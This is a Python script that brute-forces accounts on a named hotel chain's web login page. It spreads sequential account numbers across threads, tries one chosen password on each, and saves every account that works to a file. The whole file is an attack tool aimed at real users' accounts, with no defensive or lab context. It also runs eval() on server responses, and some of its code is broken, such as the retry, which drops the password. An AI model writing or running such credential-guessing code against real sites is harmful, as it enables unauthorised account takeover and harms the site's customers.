# -*- coding:utf-8 -*-
from functools import partial

from requests import request
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
import requests
import json
username_prefix = 8888000

url = "http://www.kaiyuanhotels.com/web/index/login.htm"
payload = {'userName':'0','password':'8888'}
account_start = 888800052000


def auth_account(account, password ='8888', faield_test_again = True):
    payload = {'userName': '0', 'password': '123456'}
    dict.update(payload, userName= str(account))
    dict.update(payload,password = str(password))
    payload.update()
    try:
        r = requests.get(url,payload)
        if eval(r.text)['statusCode'] == '200':
            print('----------\n--------------\n密码正确'.format(account))
            return True
        else:
            return False
    except requests.ConnectTimeout:
        if faield_test_again:
            auth_account(account, faield_test_again=False)
    except Exception as e:
        print('异常 -{}'.format(e.__cause__))
        return False

def authwarpper(*args):
    spider_kaiyuan(args)
authwarpper = partial(auth_account,)

def spider_kaiyuan(start,end,password):
    file_name = '账号{0}-{1}.txt'.format(start,end)
    with open(file_name, 'a+') as f:
        for account in range(int(start), int(end)):
            if (auth_account(account=account,password=password)):
                f.write('账号:{} 密码{}'.format(account,password) )
                f.flush()



def generate_func_args(start,end,password):
    return (start,end,password)

if __name__ == '__main__':

    pool = ThreadPool(5)
    args = []
    account_start = 888800000000
    password = input("输入测试密码 测试区间在{} -{}\n".format(account_start+5*10000,account_start+9*10000+9999))
    for i in range (5,9):
        args_map = generate_func_args(account_start+i*10000,account_start+i*10000+9999,password)
        args.append(args_map)

    pool.starmap(spider_kaiyuan, args)





